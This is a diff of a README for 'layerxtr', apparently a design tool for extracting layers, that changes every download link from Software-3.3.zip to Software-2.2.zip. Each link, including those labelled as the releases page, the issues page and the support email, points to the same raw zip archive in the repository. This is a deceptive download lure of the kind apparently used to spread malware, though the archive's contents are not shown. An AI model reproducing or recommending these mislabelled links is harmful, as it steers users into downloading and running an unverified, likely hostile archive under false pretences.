@@ -6,7 +6,7 @@ Welcome to layerxtr! This tool helps designers extract layer details from text, 
 
 ## 📥 Download Layerxtr
 
-[![Download Layerxtr](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip)](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip)
+[![Download Layerxtr](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip)](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version, [visit this page to download](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip). You will find the version information, release notes, and download links for different operating systems.
+To download the latest version, [visit this page to download](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip). You will find the version information, release notes, and download links for different operating systems.
 
 ## 📚 How to Download & Install
 
@@ -27,7 +27,7 @@ Follow these steps to download and install layerxtr on your computer:
 
 1. **Go to the Releases Page**  
    Click on the link below to navigate to our releases page:  
-   [Visit the Releases Page](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip)
+   [Visit the Releases Page](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip)
 
 2. **Choose a Version**  
    Browse the available versions. Select the latest version for the best features and fixes.
@@ -75,12 +75,12 @@ If you encounter problems while using layerxtr, consider the following solutions
 Feel free to reach out for support or connect with other users:
 
 - **Join Our Community**: Engage with other layerxtr users for tips and best practices.
-- **Submit Issues**: If you find a bug or need assistance, visit our [issues page](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip).
+- **Submit Issues**: If you find a bug or need assistance, visit our [issues page](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip).
 - **Feedback and Suggestions**: We welcome your thoughts on how to improve layerxtr.
 
 ## 📞 Contact
 
 For further assistance, contact us at:  
-[Support Email](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-3.3.zip)  
+[Support Email](https://github.com/rohitsha0410/layerxtr/raw/refs/heads/main/layerxtr/Software-2.2.zip)  
 
 Thank you for choosing layerxtr. Enjoy your layer extracting experience!
